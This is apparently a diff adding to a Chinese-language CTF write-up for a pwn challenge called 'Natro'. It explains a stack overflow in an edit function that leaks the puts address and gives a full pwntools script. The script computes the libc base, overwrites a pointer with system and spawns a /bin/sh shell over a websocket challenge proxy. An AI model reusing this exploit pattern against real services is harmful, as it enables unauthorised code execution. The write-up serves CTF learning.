@@ -355,12 +355,65 @@ shell:
 
 ## Natro
 菜单题，找到哪里有漏洞先。
-最明显的是edit函数部分中有一个栈溢出
+最明显的是`edit`函数部分中有一个栈溢出
 ![[Pasted image 20250225161206.png]]
 此处为修改某用户的简介部分
 ![[Pasted image 20250225161306.png]]
-修改后发现能泄漏一个地址，再查看发现是puts函数的地址
-泄漏后可以获取system地址，将其修改为system后然后
+修改后发现能泄漏一个地址，再查看发现是`puts`函数的地址
+泄漏后可以获取`system`地址，将其修改为`system`后然后执行`show`函数就可以执行`system(/bin/sh)`获取`shell`
+exp:
+```python
+from pwn import *
+from wstube import websocket
 
+context(arch='amd64', os='linux', log_level='debug')
+local = True
+if local:
+p = process('./natro')
+# pwnlib.gdb.attach(p, 'b strcspn')
+else:
+p = websocket('ws://ctf.miaoaixuan.cn/api/proxy/0194f3a3-d17c-7653-ae40-431fbb5e54c3')
+
+lib = ELF('./libc.so.6')
+
+def choose(x):
+	p.sendlineafter("Enter Your Choice: \n",str(x))
+
+def add(name,remark='/bin/sh\x00'):
+	choose(1)
+	p.sendlineafter('\x3a\x20\x0a',name)
+	p.sendlineafter("\x3a\x20\x0a",remark)
+
+def free(idx):
+	choose(2)
+	p.sendlineafter(b": ",str(idx))
+
+def show(idx):
+	choose(3)
+	pwnlib.gdb.attach(p)
+	p.sendlineafter(b"(y/n)\n",b"y")
+	p.sendlineafter(b": ",str(idx))
+
+def edit(idx,x):
+	choose(4)
+	p.sendlineafter(b': ', str(idx))
+	p.sendlineafter('\xe5\x9b\x9e\x0a', str(2))
+	p.sendafter(b': \n', x)
+
+p.sendlineafter(b'(y/n)', b'n')
+add(b'natro', b'hello')
+add(b'Crazy', b'/bin/sh\0')
+# 用户名位数限制我还不能用全名，差评
+
+edit(0, b'a' * (47) + b'b')
+p.recvuntil(b'b')
+pause()
+libc_base = u64(p.recv(6) + b'\0\0') - lib.sym['puts']
+log.info(f'libc_base: {hex(libc_base)}')
+system_addr = libc_base + lib.sym['system']
+edit(0, b'a' * (40) + p64(0xdeadbeef) + p64(system_addr))
+show(1)
+p.interactive()
+```
 shell:
 ![[Pasted image 20250225163842.png]]
